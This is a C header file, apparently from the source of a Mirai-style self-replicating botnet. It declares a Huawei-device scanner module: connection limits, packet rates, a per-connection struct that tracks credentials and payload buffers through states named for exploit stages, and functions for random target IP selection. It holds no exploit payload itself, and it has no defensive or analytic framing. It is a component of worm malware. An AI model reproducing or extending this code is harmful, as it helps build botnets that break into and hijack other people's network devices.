#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define HUAWEI_SCANNER_MAX_CONNS 512
#define HUAWEI_SCANNER_RAW_PPS 1440
#else
#define HUAWEI_SCANNER_MAX_CONNS 128
#define HUAWEI_SCANNER_RAW_PPS 160
#endif
#ifdef X86_64
#define HUAWEI_SCANNER_RDBUF_SIZE 1024
#define HUAWEI_SCANNER_HACK_DRAIN 64
#else
#define HUAWEI_SCANNER_RDBUF_SIZE 256
#define HUAWEI_SCANNER_HACK_DRAIN 64
#endif

struct huawei_scanner_connection
{
    int fd, last_recv;
    enum
    {
        HUAWEI_SC_CLOSED,
        HUAWEI_SC_CONNECTING,
        HUAWEI_SC_GET_CREDENTIALS,
        HUAWEI_SC_EXPLOIT_STAGE2,
        HUAWEI_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[HUAWEI_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
};

void huawei_init();
void huawei_kill(void);

static void huawei_setup_connection(struct huawei_scanner_connection *);
static ipv4_t get_random_ip(void);

#endif
